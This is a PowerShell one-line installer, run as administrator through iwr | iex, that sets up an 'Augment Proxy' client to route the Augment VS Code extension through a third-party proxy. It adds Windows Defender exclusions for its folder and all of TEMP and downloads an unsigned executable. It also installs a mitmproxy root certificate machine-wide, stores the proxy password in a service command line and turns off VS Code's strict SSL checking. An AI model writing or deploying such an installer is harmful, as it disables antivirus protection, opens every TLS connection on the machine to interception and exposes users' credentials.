#
# Augment Proxy - One-Line Installer for Windows (using Python proxy client)
# Usage: iwr -useb https://raw.githubusercontent.com/USER/augment-proxy-client/main/install-goproxy.ps1 | iex -Args "username","password"
#

param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$ProxyUsername,

    [Parameter(Mandatory=$true, Position=1)]
    [string]$ProxyPassword,

    [string]$ProxyHost = "proxy.ai-proxy.space",
    [string]$ProxyPort = "6969",
    [string]$GitHubRepo = "theguy000/augment-proxy-client",
    [switch]$NoRollback  # Debug flag to prevent rollback
)

$InstallerVersion = "3.0.0"  # Installer script version (Python proxy client)
$ErrorActionPreference = "Stop"
$GitHubRaw = "https://raw.githubusercontent.com/$GitHubRepo/main"
$InstallPath = "C:\Program Files\AugmentProxy"

# Colors for output
function Write-ColorOutput {
    param(
        [string]$Message,
        [string]$Type = "Info"
    )

    switch ($Type) {
        "Info"    { Write-Host "[INFO] $Message" -ForegroundColor Blue }
        "Success" { Write-Host "[SUCCESS] $Message" -ForegroundColor Green }
        "Warn"    { Write-Host "[WARN] $Message" -ForegroundColor Yellow }
        "Error"   { Write-Host "[ERROR] $Message" -ForegroundColor Red }
    }
}

# Add Windows Defender exclusion
function Add-DefenderExclusion {
    param([string]$Path)

    Write-ColorOutput "Adding Windows Defender exclusion for $Path..." "Info"
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

        if ($isAdmin) {
            Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
            Write-ColorOutput "Windows Defender exclusion added successfully" "Success"
        } else {
            Write-ColorOutput "Not running as administrator - skipping Defender exclusion" "Warn"
        }
    } catch {
        Write-ColorOutput "Could not add Defender exclusion: $($_.Exception.Message)" "Warn"
    }
}

# Cleanup function
function Invoke-Cleanup {
    Write-ColorOutput "Cleaning up temporary files..." "Info"
    Remove-Item "$env:TEMP\proxy_client.exe" -Force -ErrorAction SilentlyContinue -Confirm:$false
    Remove-Item "$env:TEMP\mitmproxy-ca-cert.pem" -Force -ErrorAction SilentlyContinue
}

# Rollback function
function Invoke-Rollback {
    if ($NoRollback) {
        Write-ColorOutput "Installation failed. NoRollback flag set - keeping files for debugging..." "Warn"
        Write-ColorOutput "goproxy files are in: $InstallPath" "Info"
        Invoke-Cleanup
        exit 1
    }

    Write-ColorOutput "Installation failed. Rolling back..." "Error"

    # Stop and remove proxy service
    try {
        Stop-Service -Name "AugmentProxy" -ErrorAction SilentlyContinue
        sc.exe delete "AugmentProxy" | Out-Null
    } catch {}

    # Remove installation
    Remove-Item $InstallPath -Recurse -Force -ErrorAction SilentlyContinue

    # Restore VS Code settings backup
    $settingsPath = "$env:APPDATA\Code\User\settings.json"
    if (Test-Path "${settingsPath}.backup") {
        Move-Item "${settingsPath}.backup" $settingsPath -Force
    }

    Invoke-Cleanup
    exit 1
}

# Check administrator privileges
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Administrator)) {
    Write-ColorOutput "This script requires administrator privileges" "Error"
    Write-ColorOutput "Please run PowerShell as Administrator and try again" "Warn"
    exit 1
}

# Download and install proxy client
function Install-ProxyClient {
    Write-ColorOutput "Downloading proxy client for Windows..." "Info"

    try {
        # Stop any existing processes/services first
        Write-ColorOutput "Checking for existing installation..." "Info"
        Stop-Service -Name "AugmentProxy" -Force -ErrorAction SilentlyContinue
        Get-Process -Name "proxy_client" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2

        # Add Windows Defender exclusions BEFORE downloading
        Add-DefenderExclusion -Path $InstallPath
        Add-DefenderExclusion -Path $env:TEMP

        # Remove old installation if exists
        if (Test-Path $InstallPath) {
            Write-ColorOutput "Removing old installation..." "Info"
            Remove-Item $InstallPath -Recurse -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 1
        }

        # Create installation directory
        New-Item -ItemType Directory -Force -Path $InstallPath | Out-Null

        # Download proxy client binary from GitHub repo
        $proxyUrl = "$GitHubRaw/binaries/windows/proxy_client.exe"
        $tempExePath = "$env:TEMP\proxy_client.exe"

        Write-ColorOutput "Downloading proxy client binary from GitHub..." "Info"
        Invoke-WebRequest -Uri $proxyUrl -OutFile $tempExePath -UseBasicParsing

        # Verify download
        if (Test-Path $tempExePath) {
            Copy-Item $tempExePath -Destination "$InstallPath\proxy_client.exe" -Force
            Write-ColorOutput "Proxy client installed successfully" "Success"
        } else {
            throw "Could not download proxy_client.exe from GitHub"
        }

    } catch {
        Write-ColorOutput "Failed to download proxy client: $_" "Error"
        Invoke-Rollback
    }
}

# Install mitmproxy certificate
function Install-Certificate {
    Write-ColorOutput "Downloading mitmproxy certificate..." "Info"

    try {
        $certUrl = "$GitHubRaw/certs/mitmproxy-ca-cert.pem"
        $certPath = "$env:TEMP\mitmproxy-ca-cert.pem"

        Invoke-WebRequest -Uri $certUrl -OutFile $certPath -UseBasicParsing

        Write-ColorOutput "Installing certificate to Trusted Root Certification Authorities..." "Info"
        Import-Certificate -FilePath $certPath -CertStoreLocation Cert:\LocalMachine\Root | Out-Null

        Write-ColorOutput "Certificate installed successfully" "Success"
    } catch {
        Write-ColorOutput "Failed to install certificate: $_" "Error"
        Invoke-Rollback
    }
}

# Start proxy client service
function Start-ProxyService {
    Write-ColorOutput "Starting proxy client..." "Info"

    $binaryPath = "$InstallPath\proxy_client.exe"

    try {
        # Verify executable exists
        if (-not (Test-Path $binaryPath)) {
            throw "Proxy client executable not found at: $binaryPath"
        }

        Write-ColorOutput "Creating Windows service..." "Info"

        # Create service using sc.exe
        # The proxy_client.exe takes username and password as arguments
        $serviceArgs = "$ProxyUsername $ProxyPassword"

        $serviceBinPath = "`"$binaryPath`" $serviceArgs"

        sc.exe create AugmentProxy binPath= $serviceBinPath start= auto DisplayName= "Augment Proxy Service" | Out-Null

        # Start service
        Start-Sleep -Seconds 2
        Start-Service -Name "AugmentProxy" -ErrorAction Stop

        # Wait for service to start
        Start-Sleep -Seconds 3

        # Verify service is running
        $service = Get-Service -Name "AugmentProxy"
        if ($service.Status -ne "Running") {
            throw "Service status: $($service.Status)"
        }

        Write-ColorOutput "Proxy client service started successfully" "Success"

        # Test if proxy is listening on port 3128
        Start-Sleep -Seconds 2
        try {
            $testConnection = Test-NetConnection -ComputerName localhost -Port 3128 -WarningAction SilentlyContinue
            if ($testConnection.TcpTestSucceeded) {
                Write-ColorOutput "Proxy client is listening on port 3128" "Success"
            } else {
                Write-ColorOutput "Warning: Proxy service is running but not listening on port 3128" "Warn"
            }
        } catch {
            Write-ColorOutput "Could not test port 3128: $_" "Warn"
        }

    } catch {
        Write-ColorOutput "Failed to start proxy client: $_" "Error"
        Invoke-Rollback
    }
}

# Configure VS Code
function Set-VSCodeProxy {
    Write-ColorOutput "Configuring VS Code proxy settings..." "Info"

    try {
        $settingsPath = "$env:APPDATA\Code\User\settings.json"
        
        # Create backup
        if (Test-Path $settingsPath) {
            Copy-Item $settingsPath "${settingsPath}.backup" -Force
        }

        # Read existing settings or create new
        if (Test-Path $settingsPath) {
            $settings = Get-Content $settingsPath -Raw | ConvertFrom-Json
        } else {
            $settings = @{}
        }

        # Update proxy settings
        $settings | Add-Member -NotePropertyName "http.proxy" -NotePropertyValue "http://localhost:3128" -Force
        $settings | Add-Member -NotePropertyName "http.proxyStrictSSL" -NotePropertyValue $false -Force

        # Save settings
        $settings | ConvertTo-Json -Depth 10 | Set-Content $settingsPath -Force

        Write-ColorOutput "VS Code settings updated" "Success"
    } catch {
        Write-ColorOutput "Failed to update VS Code settings: $_" "Warn"
    }
}

# Test proxy connectivity
function Test-ProxyConnectivity {
    Write-ColorOutput "Testing proxy connectivity..." "Info"

    try {
        $testUrl = "http://d18.api.augmentcode.com/health"
        $proxy = "http://localhost:3128"
        
        $response = Invoke-WebRequest -Uri $testUrl -Proxy $proxy -ProxyUseDefaultCredentials -TimeoutSec 10 -ErrorAction Stop
        
        Write-ColorOutput "Proxy connectivity test successful!" "Success"
    } catch {
        Write-ColorOutput "Proxy connectivity test failed: $($_.Exception.Message)" "Warn"
        Write-ColorOutput "This may be normal if the upstream proxy requires additional configuration" "Info"
    }
}

# Main installation flow
try {
    Write-Host ""
    Write-Host "=========================================" -ForegroundColor Cyan
    Write-Host "Augment Proxy - One-Line Installer" -ForegroundColor Cyan
    Write-Host "Version: $InstallerVersion" -ForegroundColor Cyan
    Write-Host "=========================================" -ForegroundColor Cyan
    Write-Host ""

    Install-ProxyClient
    Install-Certificate
    Start-ProxyService
    Set-VSCodeProxy
    Test-ProxyConnectivity
    Invoke-Cleanup

    Write-Host ""
    Write-Host "Installation completed successfully!" -ForegroundColor Green
    Write-Host ""
    Write-Host "Next steps:" -ForegroundColor Cyan
    Write-Host "1. Restart VS Code" -ForegroundColor White
    Write-Host "2. The Augment extension will now work through the proxy" -ForegroundColor White
    Write-Host ""
    Write-Host "Configuration:" -ForegroundColor Cyan
    Write-Host "  Proxy client running on: localhost:3128" -ForegroundColor White
    Write-Host "  Proxy server: ${ProxyHost}:${ProxyPort}" -ForegroundColor White
    Write-Host "  Username: $ProxyUsername" -ForegroundColor White
    Write-Host ""
    Write-Host "Troubleshooting:" -ForegroundColor Cyan
    Write-Host "  Check service status: Get-Service AugmentProxy" -ForegroundColor White
    Write-Host "  Restart service: Restart-Service AugmentProxy" -ForegroundColor White
    Write-Host "  Installation path: $InstallPath" -ForegroundColor White
    Write-Host ""

} catch {
    Write-ColorOutput "Installation failed: $_" "Error"
    Invoke-Rollback
}

